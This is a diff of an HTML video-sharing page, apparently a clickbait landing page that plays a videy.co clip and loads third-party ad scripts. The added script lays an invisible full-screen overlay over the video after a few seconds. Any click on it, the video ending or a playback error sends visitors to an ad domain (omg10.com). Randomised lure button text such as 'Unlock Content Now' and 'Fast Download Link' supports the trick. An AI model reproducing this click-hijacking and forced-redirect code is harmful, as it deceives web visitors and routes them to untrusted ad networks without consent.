@@ -1,50 +1,154 @@
+
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>beautiful 𝐂𝐨𝐧𝐭𝐞𝐧𝐭 𝙋𝙡𝙖𝙮 𝙑𝙡𝘿 𝙃𝙚𝙧𝙚</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f4f4f4;
-            padding: 20px;
-        }
-        .video-container {
-            max-width: 720px;
-            margin: auto;
-            background: #fff;
-            padding: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
-        }
-        video {
-            width: 100%;
-            border-radius: 8px;
-        }
-        .ad-banner {
-            margin-top: 10px;
-        }
-        .ad-banner img {
-            width: 100%;
-            max-height: 90px;
-            border-radius: 8px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="monetag" content="ad9800a440d9aeda37f15a0de4b1708f">
+  <title>IcL5k6bL1.mp4</title>
+  <link rel="icon" href="https://videy.co/favicon.ico">
+  <script>(function(s){s.dataset.zone='10711142';s.src='https://al5sm.com/tag.min.js'})(document.createElement('script'))</script>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      height: 100%;
+      background: #000;
+      color: #fff;
+      overflow: hidden;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+
+    .wrap {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #000;
+    }
+
+    video {
+      max-width: 100%;
+      max-height: 100%;
+      object-fit: contain;
+    }
+
+    #interceptor {
+      position: fixed;
+      inset: 0;
+      z-index: 9998;
+      background: transparent;
+      display: none;
+      cursor: pointer;
+    }
+
+    .ad-container {
+      position: absolute;
+      bottom: 10px;
+      left: 0;
+      right: 0;
+      text-align: center;
+      z-index: 9999;
+      pointer-events: none;
+    }
+
+    .ad-container a {
+      pointer-events: auto;
+    }
+
+    .ad-link {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 10px 20px;
+      border-radius: 6px;
+      text-decoration: none;
+      color: #60a5fa;
+      font-weight: 600;
+      font-size: 0.95rem;
+      display: inline-block;
+      transition: all 0.2s;
+    }
+
+    .ad-link:hover {
+      color: #93c5fd;
+      background: rgba(0, 0, 0, 0.8);
+      transform: translateY(-1px);
+    }
+  </style>
 </head>
 <body>
 
-    <div class="separator" style="clear: both; text-align: center;"><iframe width="100%" height="100%"
-    src="https://cdn.videy.co/n2dxN5un1.mp4"
-    frameborder="0" style="position:absolute; top:5; left: 0">
-  </iframe></object></div>
-<script async="async" data-cfasync="false" src="https://hypothesisgarden.com/c41a23ff90a4cb9a439bd54b5d951bc3/invoke.js"></script>
-<div id="container-c41a23ff90a4cb9a439bd54b5d951bc3"></div>
+<div class="wrap">
+  <video id="v" controls playsinline preload="metadata" controlsList="nodownload">
+    <source src="https://cdn2.videy.co/IcL5k6bL1.mp4" type="video/mp4">
+  </video>
+</div>
+
+<div id="interceptor"></div>
+
+<div class="ad-container">
+  <a href="https://omg10.com/4/10714977" class="ad-link" id="btn">Continue Watching</a>
+</div>
+
+<script>
+  const video = document.getElementById('v');
+  const interceptor = document.getElementById('interceptor');
+  const btn = document.getElementById('btn');
+  const REDIRECT = "https://omg10.com/4/10714977";
+  let redirected = false;
+
+  const phrases = [
+    "Proceed to Full Video",
+    "Unlock Content Now",
+    "Watch in HD Quality",
+    "Fast Download Link",
+    "Continue to Player",
+    "Get Full Access"
+  ];
+
+  function goRedirect() {
+    if (redirected) return;
+    redirected = true;
+    window.location.replace(REDIRECT);
+  }
+
+  if (btn) {
+    btn.textContent = phrases[Math.floor(Math.random() * phrases.length)];
+    btn.addEventListener('click', e => { e.preventDefault(); goRedirect(); });
+  }
+
+  if (video) {
+    video.muted = true;
+    video.play().catch(() => {});
+
+    video.addEventListener('ended', goRedirect);
+    video.addEventListener('error', () => setTimeout(goRedirect, 1000));
+
+    let active = false;
+    video.addEventListener('timeupdate', () => {
+      if (!active && video.currentTime > 8) {
+        active = true;
+        interceptor.style.display = 'block';
+      }
+    });
+  }
+
+  setTimeout(() => { interceptor.style.display = 'block'; }, 15000);
+
+  interceptor.addEventListener('click', goRedirect);
+
+  // Auto fullscreen dihapus supaya tidak ada warning
+</script>
 
    <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5007039,4,0,0,0,00010000']);
+_Hasync.push(['Histats.start', '1,5009868,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -52,8 +156,7 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5007039&101" alt="" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5009868&101" alt="" border="0"></a></noscript>
 <!-- Histats.com  END  -->
-
 </body>
 </html>
